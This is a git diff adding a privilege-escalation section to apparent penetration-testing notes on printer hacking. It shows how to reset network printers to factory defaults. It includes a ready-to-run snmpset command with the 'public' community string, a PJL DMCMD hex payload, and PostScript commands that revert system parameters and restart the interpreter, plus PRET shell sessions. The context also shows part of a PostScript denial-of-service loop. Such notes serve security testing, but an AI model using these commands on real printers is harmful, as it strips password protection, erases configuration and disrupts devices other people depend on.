@@ -117,3 +117,53 @@ Taking printer offline in... 10 9 8 7 6 5 4 3 2 1 KABOOM!
   >> setsystemparams /counter counter 1 add def
 } loop
 ```
+
+### [Privilege Escalation](http://hacking-printers.net/wiki/index.php/Privilege_escalation)
+
+#### [Factory Defaults](http://hacking-printers.net/wiki/index.php/Factory_defaults)
+
+- resetting device to factory defaults often opens holes as the factory defaults are usually known/public
+- can usually be done by pressing a special key combination on the printer's control panel
+
+*Using SNMP*
+
+- The Printer-MIB defines the prtGeneralReset Object (OID 1.3.6.1.2.1.43.5.1.1.3.1) which allows an attacker to restart the device (powerCycleReset(4)), reset the NVRAM settings (resetToNVRAM(5)) or restore factory defaults (resetToFactoryDefaults(6)) using SNMP.
+- supported by a large variety of printers and removes all protection mechanisms like user-set passwords for the embedded web server
+- all static IP address configuration will be lost and without DHCP service on network, attacker might not be able to reconnect
+- use SNMP to test this attack : `snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6`
+- Anyone who can send network packets to port 161/udp of the printer device can perform this attack
+
+*Using PML/PJL*
+
+- most likely to only work on HP printers because SNMP can be transformed into its PML representation and embed the request within a legitimate print job on HP printers
+- Example PJL : `@PJL DMCMD ASCIIHEX="040006020501010301040106"`
+- PRET example
+
+```
+./pret.py -q printer pjl
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> reset
+printer:/> restart
+```
+
+- Anyone who can print, for example through USB drive or cable, Port 9100 printing or Cross-site printing can perform this attack.
+
+*Using PostScript*
+
+- `FactoryDefaults` system parameter, a flag that, if set to true immediately before the printer is turned off, causes all nonvolatile parameters to revert to their factory default values at the next power-on
+- Restarting the printer on the other hand can be accomplished by SNMP and PML
+- Restarting with PostScript requires valid password so restart might be easier to get done with SNMP/PML after postscript attack
+- Infinite loop attack via postscript might be an alternative for forcing users to reboot their printers
+- Set Postscript sys params to factory defaults: `<< /FactoryDefaults true >> setsystemparams` and restart the PostScript interpreter and virtual memory with `true 0 startjob systemdict /quit get exec`
+- PRET Example
+
+```
+./pret.py -q printer ps
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> reset
+printer:/> restart
+```
